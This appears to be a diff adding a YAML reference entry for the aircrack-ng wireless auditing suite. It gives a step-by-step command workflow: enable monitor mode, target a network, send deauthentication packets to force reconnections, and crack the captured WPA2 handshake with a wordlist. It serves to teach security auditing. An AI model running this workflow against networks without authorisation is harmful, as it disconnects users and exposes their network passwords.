@@ -1,0 +1,51 @@
+tool: aircrack-ng
+package: aircrack-ng
+category: wireless
+description: WiFi security auditing suite — capture handshakes and crack WPA/WPA2 passwords
+when_to_use: When auditing wireless networks. Works by capturing the 4-way handshake that happens when a device connects, then cracking it offline.
+
+commands:
+  - cmd: "airmon-ng start wlan0"
+    meaning: Put your WiFi adapter into monitor mode — required before capturing anything
+    flag: "start"
+    flag_meaning: Enables monitor mode on the interface so it can capture all nearby traffic
+
+  - cmd: "airodump-ng wlan0mon"
+    meaning: Scan and list all nearby WiFi networks and connected clients
+
+  - cmd: "airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon"
+    meaning: Target a specific network and save captured packets to a file
+    flag: "-c"
+    flag_meaning: Channel — lock to the target network's channel
+    combine_with:
+      - cmd: "airodump-ng -c 6 --bssid <bssid> -w capture wlan0mon"
+        meaning: Run this while the deauth attack is happening to catch the handshake
+
+  - cmd: "aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon"
+    meaning: Send deauthentication packets to force clients to reconnect — triggers a handshake capture
+    flag: "-0"
+    flag_meaning: Deauth attack — disconnects clients so they reconnect and expose the handshake
+
+  - cmd: "aircrack-ng capture.cap -w wordlist.txt"
+    meaning: Crack a captured WPA2 handshake using a wordlist
+
+  - cmd: "airmon-ng stop wlan0mon"
+    meaning: Take the adapter out of monitor mode and return to normal
+
+workflow:
+  - step: 1
+    description: "airmon-ng start wlan0 — enable monitor mode"
+  - step: 2
+    description: "airodump-ng wlan0mon — find your target, note BSSID and channel"
+  - step: 3
+    description: "airodump-ng -c <ch> --bssid <bssid> -w capture wlan0mon — start capturing"
+  - step: 4
+    description: "aireplay-ng -0 5 -a <bssid> wlan0mon — deauth to force handshake"
+  - step: 5
+    description: "aircrack-ng capture.cap -w rockyou.txt — crack the handshake"
+
+after:
+  - hashcat
+
+path: wireless
+path_step: 1
